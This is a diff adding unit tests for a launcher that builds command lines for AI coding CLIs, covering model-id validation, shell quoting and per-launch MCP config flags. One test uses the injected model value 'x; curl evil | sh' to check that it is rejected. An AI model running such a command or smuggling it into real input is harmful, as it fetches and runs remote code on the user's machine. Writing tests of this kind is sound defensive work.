@@ -6,7 +6,9 @@ import {
   composeProfilePrompt,
   enforcementFor,
   loopModelArgs,
+  profileMcpArgs,
   profileModelArgs,
+  shellWord,
   promptDeliveryFor,
 } from './index';
 
@@ -26,6 +28,20 @@ describe('profileModelArgs', () => {
   });
   it('resolves another CLI through its model list', () => {
     expect(profileModelArgs('agy', 'gemini-4-argon-low')).toEqual(['--model', 'gemini-4-argon-low']);
+  });
+  it('adds no flag for a model id the base CLI does not list — an imported file can carry anything', () => {
+    expect(profileModelArgs('codex', 'x; curl evil | sh')).toEqual([]);
+    expect(profileModelArgs('agy', 'not-a-model')).toEqual([]);
+    const line = buildProfileLaunchLine({ base: BUILTIN_AGENTS.find((a) => a.id === 'codex')!, model: 'x; curl evil | sh', promptPath: null, delivery: 'argument', mcpArgs: [], resume: false });
+    expect(line).not.toContain('curl');
+  });
+});
+
+describe('shellWord', () => {
+  it('leaves a safe word bare and quotes anything else exactly, whitespace included', () => {
+    expect(shellWord('--model')).toBe('--model');
+    expect(shellWord('a  b')).toBe("'a  b'");
+    expect(shellWord("it's")).toBe(String.raw`'it'\''s'`);
   });
 });
 
@@ -79,5 +95,37 @@ describe('buildProfileLaunchLine', () => {
   it('adds no prompt words for none or a null path', () => {
     expect(buildProfileLaunchLine({ base: claude, model: 'default', promptPath: null, delivery: 'flag', mcpArgs: [], resume: false })).not.toContain('append');
     expect(buildProfileLaunchLine({ base: agent('aider'), model: 'default', promptPath: '/p.md', delivery: 'none', mcpArgs: [], resume: false })).not.toContain('/p.md');
+  });
+});
+
+describe('profileMcpArgs (Phase 154 Theme G)', () => {
+  const launch = { command: '/App/Midnite Studio', args: ['/shim.js', '--socket', '/s/p-1.sock'], env: { ELECTRON_RUN_AS_NODE: '1' } };
+
+  it('Claude: a midnite --mcp-config, strict only when restricted; quoted for a typed line, raw for an argv', () => {
+    const typed = profileMcpArgs('claude', launch, { restricted: true, quote: true });
+    expect(typed).toEqual([
+      '--mcp-config',
+      `'${JSON.stringify({ mcpServers: { midnite: launch } })}'`,
+      '--strict-mcp-config',
+    ]);
+    expect(profileMcpArgs('claude', launch, { restricted: false, quote: false })).toEqual([
+      '--mcp-config',
+      JSON.stringify({ mcpServers: { midnite: launch } }),
+    ]);
+  });
+
+  it('Codex: command, args and env, all three, so nothing of a global midnite entry redirects the socket', () => {
+    expect(profileMcpArgs('codex', launch, { restricted: true, quote: false })).toEqual([
+      '-c',
+      'mcp_servers.midnite.command="/App/Midnite Studio"',
+      '-c',
+      'mcp_servers.midnite.args=["/shim.js", "--socket", "/s/p-1.sock"]',
+      '-c',
+      'mcp_servers.midnite.env={ ELECTRON_RUN_AS_NODE = "1" }',
+    ]);
+  });
+
+  it('nothing for a CLI with no per-launch MCP config', () => {
+    expect(profileMcpArgs('aider', launch, { restricted: true, quote: true })).toEqual([]);
   });
 });
